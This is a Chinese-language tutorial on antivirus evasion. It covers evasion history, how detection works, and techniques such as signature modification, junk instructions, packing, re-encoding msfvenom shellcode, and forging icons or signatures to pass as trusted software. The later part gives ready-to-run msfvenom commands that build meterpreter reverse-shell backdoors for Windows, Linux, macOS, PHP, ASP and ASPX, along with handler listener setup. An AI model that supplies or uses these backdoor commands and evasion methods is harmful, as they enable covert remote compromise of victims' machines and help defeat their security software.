# 一、简介

## 1.免杀技术发展史

```
 理论上讲，免杀一定是出现在杀毒软件之后的。而通过杀毒软件的发展史不难知道，第一款杀毒软件kill 1.0是Wish公司1987年推出的，也就是说免杀技术至少是在1989年以后才发展起来的。关于世界免杀技术的历史信息已无从考证，但从国内来讲，免杀技术的起步可以说是非常晚了。

1989年：第一款杀毒软件Mcafee诞生，标志着反病毒与反查杀时代的到来。

1997年：国内出现了第一个可以自动变异的千面人病毒（Polymorphic/Mutation Virus）。自动变异就是病毒针对杀毒软件的免杀方法之一，但是与免杀手法的定义有出入。

2002年7月31日：国内第一个真正意义上的变种病毒“中国黑客II”出现，它除了具有新的特征之外，还实现了“中国黑客”第一代所未实现的功能，可见这个变种也是病毒编写者自己制造的。

2005年09月：免杀技术开始真正的火起来。

由上面的信息可见，国内在1997年出现了第一个可以自动变异的千面人病毒，虽然自动变异也可以看为是针对杀毒软件的一种免杀方法，但是由于与免杀手法的定义有出入，所以如果将国内免杀技术起源定位1997年会显得比较牵强。

一直等到2002年7月31日，国内第一个真正意义上的变种病毒“中国黑客II”才迟迟出现，因此我们暂且可以将国内免杀技术的起源定位在2002年7月。

```

## 2、杀软原理简介

```
免杀概念
免杀，也就是反病毒（AntiVirus）与反间谍（AntiSpyware）的对立面，英文为Anti-AntiVirus（简写Virus AV），逐字翻译为“反-反病毒”，翻译为“反杀毒技术”。

杀毒软件检测方式
特征代码法：“同一病毒或同类病毒的某一部分代码相同”的原理来识别病毒文件。该技术是利用留在受感染文件中的病毒特征值进行检测。发现新病毒后，对其进行分析，根据其特征编成病毒码，加入到数据库中。今后在执行查毒程序时，通过对比文件与病毒数据库中的病毒特征码，检查文件是否含有病毒。
校验和法：此法计算文件的校验和并保存，可定期或调用文件时进行对比，从而判断文件是否被病毒感染。
行为监测法：此法根据病毒的行为特征来识别病毒，这需要对病毒行为进行详细的分类和研究，分析那些病毒共同的行为，以及正常程序的罕见行为，根据程序运行时的行为进行病毒判断和预警。
软件模拟法：这种方法通过模拟病毒运行的方式来检测病毒特征。

杀毒软件主动防御
HIPS(主机入侵防御系统)，常说的安全防护就是HIPS,其实就是杀毒软件会监控进程、流量，再和病毒库匹配，以及对不认识的文件上传到服务器进行模拟运行，研判是否是病毒，然后指导杀毒软件进行行为监控或者处理。
```
## 3、免杀技术介绍
### 1).修改特征码
免杀的最基本思想就是破坏特征，这个特征有可能是特征码，有可能是行为特征，只要破坏了病毒与木马所固有的特征，并保证其原有功能没有改变，一次免杀就能完成了。（特征码：能识别一个程序是病毒的一段不大于64字节的特征串）
就目前的反病毒技术来讲，更改特征码从而达到免杀的效果事实上包含着两种方式。
一种是改特征码，这也是免杀的最初方法。例如一个文件在某一个地址内有“灰鸽子上线成功！”这么一句话，表明它就是木马，只要将相应地址内的那句话改成别的就可以了，如果是无关痛痒的，直接将其删掉也未尝不可
第二种是针对目前推出的校验和查杀技术提出的免杀思想，它的原理虽然仍是特征码，但是已经脱离纯粹意义上特征码的概念，不过万变不离其宗。其实校验和也是根据病毒文件中与众不同的区块计算出来的，如果一个文件某个特定区域的校验和符合病毒库中的特征，那么反病毒软件就会报警。所以如果想阻止反病毒软件报警，只要对病毒的特定区域进行一定的更改，就会使这一区域的校验和改变，从而达到欺骗反病毒软件的目的。
修改特征码最重要的是定位特征码，但是定位了特征码修改后并不代表程序就能正常运行，费时费力，由于各个杀软厂商的特征库不同，所以一般也只能对一类的杀软起效果。虽然效果不好，但有时候在没有源码的情况下可以一用。
### 2).花指令免杀
花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。
大多数反病毒软件是靠特征码来判断文件是否有毒的，而为了提高精度，现在的特征码都是在一定偏移量限制之内的，否则会对反病毒软件的效率产生严重的影响！而在黑客们为一个程序添加一段花指令之后，程序的部分偏移会受到影响，如果反病毒软件不能识别这段花指令，那么它检测特征码的偏移量会整体位移一段位置，自然也就无法正常检测
### 3).内存免杀
CPU不可能是为某一款加壳软件而特别设计的，因此某个软件被加壳后的可执行代码CPU是读不懂的。这就要求在执行外壳代码时，要先将原软件解密，并放到内存里，然后再通知CPU执行。
因为杀毒软件的内存扫描原理与硬盘上的文件扫描原理都是一样的，都是通过特征码比对的，只不过为了制造迷惑性，大多数反病毒公司的内存扫描与文件扫描采用的不是同一套特征码，这就导致了一个病毒木马同时拥有两套特征码，必须要将它们全部破坏掉才能躲过反病毒软件的查杀。
因此，除了加壳外，黑客们对抗反病毒软件的基本思路没变。而对于加壳，只要加一个会混淆程序原有代码的“猛”壳，其实还是能躲过杀毒软件的查杀的。
### 4).加壳免杀
说起软件加壳，简单地说，软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样罢了。壳就是软件的所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。
当我们运行这个加壳程序时，系统首先会运行程序的“壳”，然后由壳将加密的程序逐步还原到内存中，最后运行程序。这样一来，在我们看来，似乎加壳之后的程序并没有什么变化，然而它却达到了加密的目的，这就是壳的作用。
加壳虽然对于特征码绕过有非常好的效果，加密壳基本上可以把特征码全部掩盖，但是缺点也非常的明显，因为壳自己也有特征。在某些比较流氓的国产杀软的检测方式下，主流的壳如VMP, Themida等，一旦被检测到加壳直接弹框告诉你这玩意儿有问题，虽然很直接，但是还是挺有效的。有些情况下，有的常见版本的壳会被直接脱掉分析。
面对这种情况可以考虑用一切冷门的加密壳，有时间精力的可以基于开源的压缩壳改一些源码，效果可能会很不错。
总得来说，加壳的方式来免杀还是比较实用的，特别是对于不开源的PE文件，通过加壳可以绕过很多特征码识别。
### 5).二次编译
metasploit的msfvenom提供了多种格式的payload和encoder，生成的shellcode也为二次加工提供了很大遍历，但是也被各大厂商盯得死死的。而shikata_ga_nai是msf中唯一的评价是excellent的编码器，这种多态编码技术使得每次生成的攻击载荷文件是不一样的，编码和解码也都是不一样。还可以利用管道进行多重编码进行免杀。
目前msfvenom的encoder特征基本都进入了杀软的漏洞库，很难实现单一encoder编码而绕过杀软，所以对shellcode进行进一步修改编译成了msf免杀的主流。互联网上有很多借助于C、C#、python等语言对shellcode进行二次编码从而达到免杀的效果。
### 6).资源修改
有些杀软会设置有扫描白名单，比如之前把程序图标替换为360安全卫士图标就能过360的查杀。
    a.加资源
    	使用ResHacker对文件进行资源操作，找来多个正常软件，将它们的资源加入到自己软件，如图片，版本信息，对话框等
    b.替换资源
    	使用ResHacker替换无用的资源（Version等）
    c.加签名
    	使用签名伪造工具，将正常软件的签名信息加入到自己软件中

# 二、常用命令

| **-p, --payload**            | **指定****payload**                                   |
| ---------------------------- | ----------------------------------------------------- |
| **--list payloads**          | 列出可以设置的payload选项                             |
| **-l, --list**               | 列出可用项                                            |
| **-n, --****nopsled**        | 指定 nop 在  payload 中的数量                         |
| **-f, --format**             | 指定文件输出格式                                      |
| **--list formats**           | 列出可用输出格式                                      |
| **-e, --encoder**            | 指定使用编码器                                        |
| **--list encoders**          | 查看可用得编码器                                      |
| **-a, --arch**               | 指定目标系统架构                                      |
| **--platform**               | 指定目标系统                                          |
| **--list platforms**         | 查看可用的目标系统                                    |
| **-s, --space**              | 未经编码的  Payload 的最大长度                        |
| **--encoder-space <length>** | 编码后的  Payload 的最大长度                          |
| **-b, --bad-chars**          | 设置在Payload  中避免出现的字符                       |
| **-i, --iterations**         | 设置  Payload 的编码次数                              |
| **-c, --add-code**           | 包含额外的win32  shellcode文件                        |
| **-x, --template**           | 指定特定的可执行文件作为模板                          |
| **-k, --keep**               | 保护模板程序的功能，注入的payload作为一个新的进程运行 |
| **-o, --out**                | 保存  Payload 到文件                                  |
| **-v, --var-name**           | 指定变量名                                            |

```
-p: 指定payload模块			-l ：列出可用项
-f ：指定文件类型			-e:  加载编码器
-b：删除无效字符			-i ：指定编码次数
-x: 捆绑文件				-o：导出文件
```

二、常见的生成后门模式

```
生成一个常见木马文件：
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 lhost=192.168.174.139 lport=1250 -f exe > shell.exe

使用msfvenom快速生成木马并且进行连接
监听模块:
use exploit/multi/handler
设置payload：
set payload windows/meterpreter/reverse_tcp
set thost 192.168.177.128
set lport 1250
run
```

```
1.Windows
Msfvenom –platform windows –a x86 –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe 
Msfvenom –platform windows –a x86 –p windows/x64/meterpreter/reverse_tcp –f exe –o C:\back.exe
 
2.Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
 
3.MAC
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
 
4.PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.153.138 LPORT =1520 -f raw > shell.php
 
5.Asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
 
6.Aspx
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f aspx > shell.aspx
```